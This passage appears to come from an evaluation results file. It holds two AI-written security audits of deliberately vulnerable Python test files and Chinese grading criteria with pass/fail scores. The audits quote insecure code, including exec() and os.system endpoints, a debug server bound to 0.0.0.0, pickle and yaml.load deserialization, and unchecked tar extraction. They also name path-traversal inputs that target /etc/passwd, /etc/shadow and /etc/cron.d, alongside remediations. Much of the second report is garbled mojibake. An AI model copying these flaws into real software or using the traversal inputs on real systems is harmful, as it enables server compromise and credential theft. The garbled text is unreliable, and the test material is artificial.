generated string (e.g., `python -c \"import secrets; print(secrets.token_hex(32))\"`).\n\n---\n\n### 8. Debug Mode Enabled on 0.0.0.0 (Critical)\n\n**Severity:** Critical\n**Location:** Line 68\n**CWE:** CWE-489\n\n**Vulnerable Code:**\n```python\napp.run(debug=True, host='0.0.0.0')\n```\n\n**Explanation:**\nThis is a compound issue:\n\n1. **`debug=True`**: The Flask debugger includes an interactive Python console accessible via the `/console` endpoint. This console is a full Python REPL -- anyone who can reach it can execute arbitrary code on the server. The Werkzeug debugger also prints detailed tracebacks to the browser, leaking source code, configuration, and internal paths.\n\n2. **`host='0.0.0.0'`**: Binds to all network interfaces, making the application accessible from any network (including the public internet if not firewalled). Combined with `debug=True`, this exposes the interactive debugger to the world.\n\n3. **Combined with the `exec()` and `os.system()` endpoints**, the debug console provides yet another layer of code execution that is often easier to exploit (a nice web UI and tab completion for the attacker).\n\n**Remediation:**\n```python\nif __name__ == '__main__':\n    app.run(debug=False, host='127.0.0.1')\n```\n- Disable debug mode in production.\n- Bind only to localhost unless a reverse proxy is configured.\n- Use a production-grade WSGI server (Gunicorn, uWSGI, Waitress) instead of Flask's built-in development server.\n\n---\n\n### 9. Missing Security Headers (Low)\n\n**Severity:** Low\n**Location:** Entire application\n\n**Explanation:**\nThe application sets no security-related HTTP response headers:\n- No `Content-Security-Policy` to prevent XSS and data injection\n- No `X-Content-Type-Options: nosniff`\n- No `X-Frame-Options` to prevent clickjacking\n- No `Strict-Transport-Security` (HSTS)\n\n**Remediation:**\nConfigure these headers, e.g., using the `flask-talisman` extension:\n```python\nfrom flask_talisman import Talisman\nTalisman(app, content_security_policy={...})\n```\n\n---\n\n## Vulnerability Summary Table\n\n| # | Vulnerability | Severity | CWE | Endpoint/Location |\n|---|--------------|----------|-----|-------------------|\n| 1 | SQL Injection | Critical | CWE-89 | `/search`, line 30 |\n| 2 | Arbitrary Code Execution via `exec()` | Critical | CWE-95 | `/admin/exec`, lines 54-58 |\n| 3 | Command Injection via `os.system()` | Critical | CWE-78 | `/export`, lines 46-51 |\n| 4 | Server-Side Template Injection (SSTI) | Critical | CWE-1336 | `/user/<name>`, line 42 |\n| 5 | Reflected / Stored XSS | Medium | CWE-79 | `/search`, line 36 |\n| 6 | Open Redirect | Medium | CWE-601 | `/redirect`, lines 61-64 |\n| 7 | Hardcoded Secret Key | High | CWE-798 | Line 9 |\n| 8 | Debug Mode on 0.0.0.0 | Critical | CWE-489 | Line 68 |\n| 9 | Missing Security Headers | Low | CWE-693 | Global |\n\n---\n\n## Attack Chain Analysis\n\nThe most dangerous combination in this application is:\n\n1. **Unprotected debug console** (`debug=True` on `0.0.0.0`) provides an interactive Python shell at `/console`.\n2. **`exec()` endpoint** (`/admin/exec`) accepts arbitrary Python code with zero authentication.\n3. **`os.system()` endpoint** (`/export`) executes arbitrary shell commands.\n4. **SSTI** (`/user/<name>`) achieves RCE via Jinja2 template engine.\n5. **SQL injection** (`/search`) exposes and corrupts all data.\n\nAn attacker can achieve **full server compromise** through any of at least five independent code paths.\n\n---\n\n## Recommendations\n\n1. **Remove the `/admin/exec` endpoint entirely.** It has no legitimate use case and is a direct RCE backdoor.\n2. **Rewrite `/export` to use Python file I/O** instead of shell commands.\n3. **Use parameterized SQL queries** throughout.\n4. **Use Jinja2 template files (.html)** instead of `render_template_string()` with user input.\n5. **Move SECRET_KEY to an environment variable** with a strong random value.\n6. **Disable debug mode** and do not bind to `0.0.0.0` in any environment.\n7. **Validate redirect targets** to only allow same-origin redirects.\n8. **Escape HTML output** or use Jinja2 auto-escaping.\n9. **Add security headers** (CSP, HSTS, X-Frame-Options, X-Content-Type-Options).\n10. **Run a SAST tool** (e.g., Bandit, Semgrep) in CI/CD to catch these patterns before deployment.\n"}], "grading": {"expectations": [{"text": "\u62a5\u544a\u5305\u542b SQL \u6ce8\u5165\u6f0f\u6d1e\u53d1\u73b0\uff08f-string \u62fc\u63a5\u67e5\u8be2\uff09", "passed": true, "evidence": "Finding #1: SQL injection at /search, line 30"}, {"text": "\u62a5\u544a\u5305\u542b SSTI \u6a21\u677f\u6ce8\u5165\u6f0f\u6d1e\u53d1\u73b0\uff08render_template_string \u63a5\u6536\u7528\u6237\u8f93\u5165\uff09", "passed": true, "evidence": "Finding #4: SSTI at /user/<name>, line 42"}, {"text": "\u62a5\u544a\u5305\u542b\u547d\u4ee4\u6ce8\u5165\u6f0f\u6d1e\u53d1\u73b0\uff08os.system \u62fc\u63a5\u7528\u6237\u8f93\u5165\uff09", "passed": true, "evidence": "Finding #3: Command injection at /export, lines 46-51"}, {"text": "\u62a5\u544a\u5305\u542b\u4ee3\u7801\u6ce8\u5165\u6f0f\u6d1e\u53d1\u73b0\uff08exec() \u6267\u884c\u7528\u6237\u8f93\u5165\uff09", "passed": true, "evidence": "Finding #2: Code execution at /admin/exec, lines 54-58"}, {"text": "\u62a5\u544a\u5305\u542b\u786c\u7f16\u7801\u5bc6\u94a5\u53d1\u73b0\uff08SECRET_KEY \u660e\u6587\u5199\u6b7b\uff09", "passed": true, "evidence": "Finding #7: Hardcoded secret key at line 9"}, {"text": "\u62a5\u544a\u5305\u542b debug \u6a21\u5f0f\u5728\u751f\u4ea7\u73af\u5883\u5f00\u542f\u7684\u53d1\u73b0", "passed": true, "evidence": "Finding #8: Debug mode at line 68"}, {"text": "\u62a5\u544a\u5305\u542b\u5f00\u653e\u91cd\u5b9a\u5411\u6f0f\u6d1e\u53d1\u73b0", "passed": true, "evidence": "Finding #6: Open redirect at /redirect, lines 61-64"}, {"text": "\u62a5\u544a\u5305\u542b XSS \u6f0f\u6d1e\u53d1\u73b0\uff08\u672a\u8f6c\u4e49\u7528\u6237\u8f93\u5165\u5199\u5165 HTML\uff09", "passed": true, "evidence": "Finding #5: Reflected XSS at /search, lines 35-36"}, {"text": "\u6bcf\u4e2a\u6f0f\u6d1e\u53d1\u73b0\u90fd\u5305\u542b\u5177\u4f53\u7684\u6587\u4ef6\u540d\u548c\u884c\u53f7", "passed": true, "evidence": "Every finding includes line numbers"}, {"text": "\u6bcf\u4e2a\u6f0f\u6d1e\u53d1\u73b0\u90fd\u5305\u542b\u4fee\u590d\u5efa\u8bae", "passed": true, "evidence": "Every finding includes remediation code"}, {"text": "\u62a5\u544a\u5305\u542b\u5b89\u5168\u8bc4\u5206\u6216\u5b89\u5168\u8bc4\u7ea7", "passed": false, "evidence": "No formal numerical score/100 or A-F grade rating present in the report"}, {"text": "\u62a5\u544a\u6309\u4e25\u91cd\u7a0b\u5ea6\u6392\u5e8f\uff08Critical/High \u6392\u524d\u9762\uff09", "passed": false, "evidence": "Inconsistent ordering: Hardcoded Secret Key (High) listed after 2 Medium findings; Debug Mode (Critical) listed after High. Actual order: Critical, Critical, Critical, Critical, Medium, Medium, High, Critical, Low"}], "summary": {"passed": 10, "failed": 2, "total": 12, "pass_rate": 0.833}}}, {"id": "data-processor-with_skill", "prompt": "I need a security audit on this Python data processor script at evals/files/case2_processor.py. Please produce a full security report.", "eval_id": 1, "outputs": [{"name": "audit_report.md", "type": "text", "content": "# \u7039\u590a\u53cf\u7039\u00a4\ufffd\u2103\u59e4\u935b\ufffd\n\n## \u7039\u00a4\ufffd\u2103\u61b3\u7455\ufffd\n- **\u7039\u00a4\ufffd\u00a4\u5bd6\u9365\ufffd**\u951b\u6b34:\\code\\agent\\miko\\miko\\miko\\data\\skills\\code-audit\\evals\\files\\case2_processor.py\n- **\u7039\u00a4\ufffd\u2103\u6902\u95c2\ufffd**\u951b\ufffd2026-06-18\n- **\u93c2\u56e6\u6b22\u93c1\u4f34\u567a**\u951b\ufffd1\n- **\u9359\u6220\u5e47\u95c2\ufffd\u68f0\ufffd**\u951b\ufffd9\u951b\u5715ritical: 3, High: 2, Medium: 3, Low: 1\u951b\ufffd\n\n---\n\n## \u9359\u6220\u5e47\u5a13\u546d\u5d1f\n\n### [Critical] \u7ead\ufffd\u7f02\u682b\u721c\u7035\u55db\u631c \u9225\ufffd case2_processor.py:14\n\n**\u93bb\u5fda\u582a**\u951b\u6b30PI Token \u6d60\u30e6\u69d1\u93c2\u56e8\u67df\u5bee\u5fd5\u2016\u7f02\u682b\u721c\u9366\u3126\u7c2e\u6d60\uff47\u721c\u6d93\ufffd\u9286\ufffd\n**\u6d60\uff47\u721c**\u951b\ufffd\n```python\nAPI_TOKEN = 'sk-proj-abc123def456ghi789jkl'\n```\n**\u690b\u5ea8\u6ad3**\u951b\u6c2b\u6362\u6d63\u66e1\u5158\u7481\u5757\u68f6\u5a67\u612e\u721c\u9428\u52ea\u6c49\u951b\u581d\u7d11\u9359\u6223\ufffd\u546b\ufffd\u4f7d\u7e4d\u7f01\u6dec\ufffd\u4f77\u552c\u942e\u4f77\u7ca8\u6434\u64b9\ufffd\u57ae\ufffd\ufffd\u951b\u5910\u5158\u9359\ufffd\u6d60\u30e7\u6d3f\u93ba\u30e8\u5e4f\u9359\u682c\ufffd\ufffd Token\u9286\u509a\ufffd\u509b\u7049\u6d60\uff47\u721c\u741a\ufffd\u93bb\u612a\u6c26\u9352\ufffd Git \u6d60\u64b3\u7c31\u951b\u5c7d\u5d46\u6d63\u57ae\u6097\u7f01\ufffd\u9352\u72bb\u6ace\u951b\u5c83\ufffd\ufffd Token \u6d94\u71b6\u7d30\u59d8\u6b4c\u7e59\u701b\u6a3a\u6e6a\u6d5c\ufffd Git \u9358\u55d7\u5f76\u7481\u677f\u7d8d\u6d93\ufffd\u9286\u509b\u657e\u9351\u660f\ufffd\u5470\u5e4f\u9359\u6828\ufffd\ufffd Token \u935a\u5ea1\u5f72\u9350\u6391\u5396\u935a\u581f\u7876\u93c8\u5d85\u59df\u9359\u6223\u6363 API \u7487\u950b\u7730\u9286\ufffd\n**CWE**\u951b\u6b33WE-798 (Use of Hard-coded Credentials)\n**\u6dc7\ufffd\u6fb6\u5d85\u7f13\u7481\ufffd**\u951b\ufffd\n```python\nimport os\nAPI_TOKEN = os.environ.get('API_TOKEN')\nif not API_TOKEN:\n    raise RuntimeError(\"API_TOKEN environment variable is required\")\n```\n**\u9359\u509d\ufffd\ufffd**\u951b\u6b68ttps://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\n\n---\n\n### [Critical] \u9359\u5d85\u7c2d\u9352\u6940\u5bf2\u5a55\u5fd4\u790a (pickle) \u9225\ufffd case2_processor.py:23-26\n\n**\u93bb\u5fda\u582a**\u951b\u6b5aload_state()` \u9351\u82a5\u669f\u6d63\u8de8\u6564 `pickle.load()` \u9354\u72ba\u6d47 pickle \u93c2\u56e6\u6b22\u951b\u5c7e\u6e6d\u7035\u89c4\u669f\u93b9\ufffd\u93c9\u30e6\u7c2e\u934b\u6c2b\u6362\u6d63\u66e2\u7359\u7487\u4f75\ufffd\u4ffbickle \u9359\u5d85\u7c2d\u9352\u6940\u5bf2\u9359\ufffd\u6d60\u30e6\u58bd\u741b\u5c7c\u6362\u93b0\u5fce\u552c\u942e\u4f75\ufffd\ufffd\n**\u6d60\uff47\u721c**\u951b\ufffd\n```python\ndef load_state(state_file):\n    \"\"\"Load processing state from a pickle file.\"\"\"\n    with open(state_file, 'rb') as f:\n        return pickle.load(f)\n```\n**\u690b\u5ea8\u6ad3**\u951b\u6c2d\u657e\u9351\u660f\ufffd\u546d\ufffd\u509b\u7049\u9473\u85c9\ufffd\u71b8\u5e36\u9352\ufffd state_file \u74ba\ufffd\u5bf0\u52ec\u5bda\u935a\u6220\u6b91\u9350\u546d\ufffd\u7678\u7d19\u6e1a\u5b2a\ufffd\u5099\u7b02\u6d7c\u72b3\u4f13\u93b0\ufffd pickle \u93c2\u56e6\u6b22\u93b4\u682c\ufffd\u55d9\u6d0a\u5bb8\u53c9\u6e41 state \u93c2\u56e6\u6b22\u951b\u591b\u7d1d\u9352\u6b0f\u6e6a pickle \u9359\u5d85\u7c2d\u9352\u6940\u5bf2\u93c3\u8dfa\u5f72\u93b5\u0446\ufffd\u5c7c\u6362\u93b0\ufffd Python \u6d60\uff47\u721c\u951b\u5c7d\u756c\u934f\u3126\u5e36\u9352\u8235\u6e47\u9354\u2033\u6ad2\u9286\ufffd\n**CWE**\u951b\u6b33WE-502 (Deserialization of Untrusted Data)\n**\u6dc7\ufffd\u6fb6\u5d85\u7f13\u7481\ufffd**\u951b\ufffd\n```python\nimport json\n\ndef load_state(state_file):\n    \"\"\"Load processing state from a JSON file.\"\"\"\n    with open(state_file, 'r') as f:\n        return json.load(f)\n```\n\u6fe1\u509b\u7049\u6d93\u6c2c\u59df\u8e47\u5474\u300f\u6d63\u8de8\u6564 pickle\u951b\u5c83\u56a6\u704f\u621d\u59de\u934f\ufffd HMAC \u7edb\u60e7\u6095\u6960\u5c83\u7609\u9a9e\u8dfa\u6e6a\u5a0c\u6b11\ufffd\u8fa9\u5e46\u6fa7\u51a7\u8151\u6769\u612f\ufffd\u5c7b\ufffd\ufffd\n**\u9359\u509d\ufffd\ufffd**\u951b\u6b68ttps://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html\n\n---\n\n### [Critical] \u9359\u5d85\u7c2d\u9352\u6940\u5bf2\u5a55\u5fd4\u790a (yaml) \u9225\ufffd case2_processor.py:17-20\n\n**\u93bb\u5fda\u582a**\u951b\u6b5aload_config()` \u9351\u82a5\u669f\u6d63\u8de8\u6564 `yaml.load()` \u9470\u5c84\u6f6a `yaml.safe_load()`\u9286\u509e\u7caf\u7481\u3087\u6b91 `yaml.load()` \u9359\ufffd\u6d60\u30e6\u702f\u95ab\u72b2\u82df\u93b5\u0446\ufffd\u5c7c\u6362\u93b0\ufffd Python \u7035\u7845\u8584\u951b\u5c7d\u74e8\u9366\u3128\u7e59\u7ecb\u5b29\u552c\u942e\u4f79\u58bd\u741b\u5c84\ufffd\u5ea8\u6ad3\u9286\ufffd\n**\u6d60\uff47\u721c**\u951b\ufffd\n```python\ndef load_config():\n    \"\"\"Load and return configuration from YAML file.\"\"\"\n    with open(CONFIG_FILE, 'r') as f:\n        return yaml.load(f)\n```\n**\u690b\u5ea8\u6ad3**\u951b\u6c2c\ufffd\u509b\u7049\u93c0\u8bf2\u56ae\u9470\u5470\u5158\u6fb6\u71b6\u6168\u93c0\ufffd `config.yml` \u9428\u52eb\u5534\u7039\u7678\u7d1d\u9359\ufffd\u6d60\u30e5\u6e6a YAML \u6d93\ufffd\u5b93\u5c7d\u53c6\u93ad\u8235\u5270 Python \u7035\u7845\u8584\u6fb9\u7248\u69d1\u951b\u5c7d\u6e6a\u9354\u72ba\u6d47\u93c3\u60f0\u0415\u9359\u621c\u6362\u93b0\u5fce\u552c\u942e\u4f79\u58bd\u741b\u5c7b\ufffd\ufffd\n**CWE**\u951b\u6b33WE-502 (Deserialization of Untrusted Data)\n**\u6dc7\ufffd\u6fb6\u5d85\u7f13\u7481\ufffd**\u951b\ufffd\n```python\ndef load_config():\n    \"\"\"Load and return configuration from YAML file.\"\"\"\n    with open(CONFIG_FILE, 'r') as f:\n        return yaml.safe_load(f)\n```\n**\u9359\u509d\ufffd\ufffd**\u951b\u6b68ttps://pyyaml.org/wiki/PyYAMLDocumentation\n\n---\n\n### [High] \u74ba\ufffd\u5bf0\u52ef\u4eb6\u9358\ufffd (Zip Slip) \u9225\ufffd case2_processor.py:34-39\n\n**\u93bb\u5fda\u582a**\u951b\u6b5aextract_archive()` \u6d63\u8de8\u6564 `tarfile.extractall()` \u7459\uff45\u5e07 tar.gz \u93c2\u56e6\u6b22\u951b\u5c7e\u6e6d\u7035\u7470\u5e07\u7f02\u2541\u5bd8\u9350\u546e\u6783\u6d60\u5241\u6b91\u74ba\ufffd\u5bf0\u52eb\u4edb\u6d60\u8bb3\u7d8d\u6769\u56e8\u62a4\u9286\u509a\u5e07\u7f02\u2541\u5bd8\u9350\u546d\u5f72\u6d60\u30e5\u5bd8\u935a\ufffd\u6d60\ufffd `../` \u5bee\ufffd\u6fb6\u5bf8\u6b91\u93c2\u56e6\u6b22\u74ba\ufffd\u5bf0\u52f6\u7d1d\u7035\u8270\u56a7\u93c2\u56e6\u6b22\u741a\ufffd\u9350\u6b0f\u53c6\u9352\u626e\u6d30\u93cd\u56e9\u6d30\u8930\u66da\u7ba3\u6fb6\u682b\u6b91\u6d60\u7ed8\u5270\u6d63\u5d87\u7586\u951b\u5738ip Slip / Tar Slip \u93c0\u8bf2\u56ae\u951b\u5908\ufffd\ufffd\n**\u6d60\uff47\u721c**\u951b\ufffd\n```python\ndef extract_archive(archive_path, dest_dir=None):\n    \"\"\"Extract uploaded tar.gz archive.\"\"\"\n    if dest_dir is None:\n        dest_dir = DATA_DIR\n    with tarfile.open(archive_path, 'r:gz') as tar:\n        tar.extractall(path=dest_dir)\n```\n**\u690b\u5ea8\u6ad3**\u951b\u6c2d\u657e\u9351\u660f\ufffd\u546d\u5f72\u6d60\u30e6\u5f41\u6e1a\u6d98\u5bd8\u935a\ufffd\u74ba\ufffd\u5bf0\u52ef\u4eb6\u9358\ufffd payload \u9428\u52ec\u4f13\u93b0\ufffd tar.gz \u93c2\u56e6\u6b22\u951b\u581c\u7de5\u6fe1\ufffd `../../../etc/cron.d/backdoor`\u951b\u591b\u7d1d\u7455\u55d9\u6d0a\u7eef\u8364\u7cba\u934f\u62bd\u656d\u93c2\u56e6\u6b22\u951b\u5c83\u5e4f\u9359\u6828\u5bd4\u6d94\u546d\u5bf2\u7481\u5757\u68f6\u93b4\u6828\u5f41\u93c9\u51a6\ufffd\ufffd\n**CWE**\u951b\u6b33WE-22 (Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal'))\n**\u6dc7\ufffd\u6fb6\u5d85\u7f13\u7481\ufffd**\u951b\ufffd\n```python\nimport os\n\ndef extract_archive(archive_path, dest_dir=None):\n    \"\"\"Extract uploaded tar.gz archive with path traversal protection.\"\"\"\n    if dest_dir is None:\n        dest_dir = DATA_DIR\n    dest_dir = os.path.realpath(dest_dir)\n    with tarfile.open(archive_path, 'r:gz') as tar:\n        for member in tar.getmembers():\n            member_path = os.path.realpath(os.path.join(dest_dir, member.name))\n            if not member_path.startswith(dest_dir + os.sep):\n                raise ValueError(f\"Path traversal detected: {member.name}\")\n            tar.extract(member, path=dest_dir)\n```\n\n---\n\n### [High] \u74ba\ufffd\u5bf0\u52ef\u4eb6\u9358\ufffd \u9225\ufffd case2_processor.py:53-58\n\n**\u93bb\u5fda\u582a**\u951b\u6b5aprocess_file()` \u704f\u55d9\u6564\u93b4\u8702\u7d36\u934f\u30e7\u6b91 `filename` \u9429\u5b58\u5e34\u93b7\u517c\u5e34\u9352\ufffd `DATA_DIR` \u74ba\ufffd\u5bf0\u52ea\u7b02\u951b\u5c7e\u6e6d\u934b\u6c2b\u6362\u6d63\u66e1\u77fe\u5bf0\u52ee\ufffd\u52ee\u5bd6\u9356\u6828\u57a8\u93c9\u51ae\u6aba\u59ab\ufffd\u93cc\u30ef\u7d1d\u93c0\u8bf2\u56ae\u9470\u546d\u5f72\u6d60\u30e4\u5a07\u9422\ufffd `../../etc/passwd` \u7edb\u590e\u77fe\u5bf0\u52ee\ufffd\u8bf2\u5f47\u6d60\u7ed8\u5270\u93c2\u56e6\u6b22\u9286\ufffd\n**\u6d60\uff47\u721c**\u951b\ufffd\n```python\ndef process_file(filename):\n    \"\"\"Read and process a file from the data directory.\"\"\"\n    filepath = os.path.join(DATA_DIR, filename)\n    with open(filepath, 'r') as f:\n        content = f.read()\n    return content.upper()\n```\n**\u690b\u5ea8\u6ad3**\u951b\u6c2d\u657e\u9351\u660f\ufffd\u546c\u7d36\u934f\ufffd `../../../etc/shadow` \u6d63\u6ec0\u8d1f filename\u951b\u5c7d\u5f72\u6d60\u30e8\ufffd\u8bf2\u5f47\u7eef\u8364\u7cba\u93c1\u5fd4\u5285\u93c2\u56e6\u6b22\u951b\u581d\ufffd\u509a\u7611\u942e\u4f79\u6783\u6d60\u8eb2\ufffd\u4e3cSH \u7035\u55db\u631c\u9286\u4f80\u53a4\u7f03\ufffd\u93c2\u56e6\u6b22\u951b\u591b\u7d1d\u7035\u8270\u56a7\u6dc7\u2103\u4f05\u5a09\u52ef\u6e76\u9286\ufffd\n**CWE**\u951b\u6b33WE-22 (Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal'))\n**\u6dc7\ufffd\u6fb6\u5d85\u7f13\u7481\ufffd**\u951b\ufffd\n```python\nimport os\n\ndef process_file(filename):\n    \"\"\"Read and process a file from the data directory.\"\"\"\n    filepath = os.path.join(DATA_DIR, filename)\n    realpath = os.path.realpath(filepath)\n    if not realpath.startswith(os.path.realpath(DATA_DIR) + os.sep):\n        raise ValueError(f\"Access denied: {filename}\")\n    with open(realpath, 'r') as f:\n        content = f.read()\n    return content.upper()\n```\n\n---\n\n### [Medium] \u5bee\u535e\u59de\u7035\u55d9\u757b\u5a09\ufffd (MD5) \u9225\ufffd case2_processor.py:42-45\n\n**\u93bb\u5fda\u582a**\u951b\u6c2c\u7611\u942e\u4f78\u6431\u752f\u5c7c\u5a07\u9422\ufffd MD5 \u7ee0\u6941\u7876\u951b\u5c7c\u7b16\u6d63\u8de8\u6564\u7ead\ufffd\u7f02\u682b\u721c\u9428\u52eb\u6d50\u7039\u6c31\u6d02\u934a\u7877\u7d19`'fixed-salt-123'`\u951b\u5908\ufffd\u4fbbD5 \u5bb8\u8336\ufffd\ufffd\u7487\u4f79\u69d1\u701b\u6a3a\u6e6a\u7eb0\u7248\u6312\u5a55\u5fd4\u790a\u951b\u5c7c\u7b09\u95ab\u509a\u608e\u7039\u590a\u53cf\u9366\u70d8\u6ad9\u9286\ufffd\n**\u6d60\uff47\u721c**\u951b\ufffd\n```python\ndef hash_password(password):\n    \"\"\"Hash a password for storage.\"\"\"\n    salt = 'fixed-salt-123'\n    return hashlib.md5((salt + password).encode()).hexdigest()\n```\n**\u690b\u5ea8\u6ad3**\u951b\ufffd\n1. MD5 \u7ee0\u6941\u7876\u5bb8\u8336\ufffd\ufffd\u942e\u78cb\u0412\u951b\u5c7e\u657e\u9351\u660f\ufffd\u546d\u5f72\u6d60\u30e9\ufffd\u6c33\u7e43\u8930\u2544\u6ae3\u741b\u3125\u63e9\u95ab\u71b7\u5f3d\u93cc\u30e5\u7611\u942e\ufffd\n2. \u9365\u54c4\u757e\u9429\u612c\ufffd\u517c\u5270\u935b\u5d07\u6f43\u93b5\ufffd\u93c8\u590c\u6564\u93b4\u5cf0\u53e1\u6d5c\ufffd\u935a\u5c7c\u7af4\u6d93\ufffd\u9429\u6136\u7d1d\u93c3\u72b3\u7876\u93b6\u975b\u5c3d\u95bd\u581d\ufffd\u89c4\ufffd\u0445\u6b91\u8930\u2544\u6ae3\u741b\u3126\u657e\u9351\ufffd\n3. MD5 \u7481\uff04\u757b\u95ab\u71b7\u5bb3\u8e47\ufffd\u951b\u5c7c\u5a07\u5bf0\u6941\u6bda\u9354\u6d9a\u726c\u7459\uff46\u579a\u93c8\ufffd\u93cb\u4f77\u7d86\n**CWE**\u951b\u6b33WE-328 (Use of Weak Hash), CWE-759 (Use of a One-Way Hash without a Salt)\n**\u6dc7\ufffd\u6fb6\u5d85\u7f13\u7481\ufffd**\u951b\ufffd\n```python\nimport hashlib\nimport os\n\ndef hash_password(password):\n    \"\"\"Hash a password for storage using PBKDF2.\"\"\"\n    salt = os.urandom(16)\n    key = hashlib.pbkdf2_hmac('sha256', password.encode(), salt, 600000)\n    return salt.hex() + ':' + key.hex()\n```\n\u93c7\u5b58\u5e39\u947d\u612a\u5a07\u9422\ufffd `bcrypt` \u93b4\ufffd `argon2-cffi` \u6434\u64b1\ufffd\ufffd\n**\u9359\u509d\ufffd\ufffd**\u951b\u6b68ttps://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html\n\n---\n\n### [Medium] \u6d93\u5d85\u7568\u934f\u3127\u6b91\u93c2\u56e6\u6b22\u93c9\u51ae\u6aba \u9225\ufffd case2_processor.py:77\n\n**\u93bb\u5fda\u582a**\u951b\u6b5aDataProcessor.process()` \u9366\u3125\ufffd\u52ed\u608a\u7f01\u64b4\u7049\u6748\u64b3\u56ad\u93c2\u56e6\u6b22\u93c3\u8bb9\u7d1d\u95ab\u6c33\u7e43 `os.chmod(output_path, 0o777)` \u7481\u5267\u7586\u6d5c\u55da\u7e43\u6d5c\u5ea1\ufffd\u82a5\u6f97\u9428\u52ec\u6f48\u95c4\u6136\u7d19\u93b5\ufffd\u93c8\u590c\u6564\u93b4\u5cf0\u5f72\u7487\u6c47\ufffd\u4f78\u5f72\u9350\u6b0d\ufffd\u4f78\u5f72\u93b5\u0446\ufffd\u5c8b\u7d1a\u9286\ufffd\n**\u6d60\uff47\u721c**\u951b\ufffd\n```python\ndef process(self, input_path, output_path):\n    with open(input_path, 'r') as f:\n        data = f.read()\n    result = self._transform(data)\n    os.chmod(output_path, 0o777)\n    with open(output_path, 'w') as f:\n        f.write(result)\n    self.processed_count += 1\n```\n**\u690b\u5ea8\u6ad3**\u951b\u6b5a0o777` \u93c9\u51ae\u6aba\u93b0\u5fd3\u61d7\u942b\ufffd\u7eef\u8364\u7cba\u6d93\u5a44\u6b91\u6d60\u8bb3\u7d8d\u9422\u3126\u57db\u95ae\u85c9\u5f72\u6d60\u30e8\ufffd\u8bf2\u5f47\u9422\u6c33\u56a6\u6dc7\ufffd\u93c0\u7845\ufffd\u30e6\u6783\u6d60\u8eb2\ufffd\u509b\u657e\u9351\u660f\ufffd\u546d\ufffd\u509b\u7049\u947e\u5cf0\u7df1\u7eef\u8364\u7cba\u6d93\u5a44\u6b91\u6d63\u5ea2\u6f48\u95c4\ufffd shell\u951b\u5c7d\u5f72\u6d60\u30e7\ufffd\u2103\u657c\u6748\u64b3\u56ad\u93c2\u56e6\u6b22\u9350\u546d\ufffd\u7678\u7d1d\u942e\u6751\u6f56\u93c1\u7248\u5d41\u7039\u5c7e\u66a3\u93ac\u0444\u57a8\u599e\u5d85\u53c6\u93ad\u8235\u5270\u9350\u546d\ufffd\u5e7f\ufffd\ufffd\n**CWE**\u951b\u6b33WE-732 (Incorrect Permission Assignment for Critical Resource)\n**\u6dc7\ufffd\u6fb6\u5d85\u7f13\u7481\ufffd**\u951b\ufffd\n```python\ndef process(self, input_path, output_path):\n    with open(input_path, 'r') as f:\n        data = f.read()\n    result = self._transform(data)\n    with open(output_path, 'w') as f:\n        f.write(result)\n    os.chmod(output_path, 0o640)  # owner read/write, group read\n    self.processed_count += 1\n```\n\n---\n\n### [Medium] \u5bee\u904d\u6ba2\u93c8\u70d8\u669f\u9422\u71b8\u579a\u9363\u3127\u6564\u6d5c\u5ea1\u7568\u934f\ufffd Token \u9225\ufffd case2_processor.py:48-50\n\n**\u93bb\u5fda\u582a**\u951b\u6b5agenerate_token()` \u6d63\u8de8\u6564 `random.choice()` \u9422\u71b8\u579a API Token\u9286\u4fd9random` \u59af\u2033\u6f61\u6d63\u8de8\u6564\u9428\u52ec\u69f8 Mersenne Twister \u7ee0\u6941\u7876\u951b\u5c7d\u53fe\u6748\u64b3\u56ad\u93c4\ufffd\u9359\ufffd\u68f0\u52ec\u7974\u9428\u52f6\u7d1d\u6d93\u5d89\ufffd\u509a\u608e\u7039\u590a\u53cf\u9366\u70d8\u6ad9\u9286\ufffd\n**\u6d60\uff47\u721c**\u951b\ufffd\n```python\ndef generate_token():\n    \"\"\"Generate a random API token.\"\"\"\n    return ''.join(random.choice('abcdef0123456789') for _ in range(32))\n```\n**\u690b\u5ea8\u6ad3**\u951b\u6c2d\u657e\u9351\u660f\ufffd\u546d\u5f72\u6d60\u30e9\ufffd\u6c33\u7e43\u7459\u509a\u7642\u6d93\ufffd\u7039\u6c2d\u669f\u95b2\u5fd5\u6b91\u95c5\u5fd4\u6e80\u6748\u64b3\u56ad\u93ba\u3126\u67c7\u9351\ufffd `random` \u59af\u2033\u6f61\u9428\u52eb\u5534\u95ae\u3127\u59f8\u93ac\u4f8a\u7d1d\u6d60\u5ea4\ufffd\u5c84\ufffd\u52ec\u7974\u935a\u5ea3\u753b\u9422\u71b8\u579a\u9428\ufffd Token\u9286\u509a\ufffd\u509b\u7049\u59dd\ufffd Token \u9422\u3124\u7c2c\u97ec\ufffd\u6d60\u501f\ufffd\u3088\u7609\u951b\u5c7e\u657e\u9351\u660f\ufffd\u546d\u5f72\u6d60\u30e4\u5409\u95ab\u72b3\u6e41\u93c1\u5822\u6b91 Token \u7f01\u66e1\u7e43\u7481\u3088\u7609\u9286\ufffd\n**CWE**\u951b\u6b33WE-338 (Use of Cryptographically Weak Pseudo-Random Number Generator (PRNG))\n**\u6dc7\ufffd\u6fb6\u5d85\u7f13\u7481\ufffd**\u951b\ufffd\n```python\nimport secrets\n\ndef generate_token():\n    \"\"\"Generate a cryptographically random API token.\"\"\"\n    return secrets.token_hex(16)  # 32 hex characters\n```\n\n---\n\n### [Low] \u6d93\u5d85\u7568\u934f\u3127\u6b91\u6d93\u5b58\u6902\u93c2\u56e6\u6b22\u93bf\u5d84\u7d94 \u9225\ufffd case2_processor.py:61-65\n\n**\u93bb\u5fda\u582a**\u951b\u6b5acleanup_temp_files()` \u9429\u5b58\u5e34\u95ac\u5d85\u5dfb `/tmp/processor` 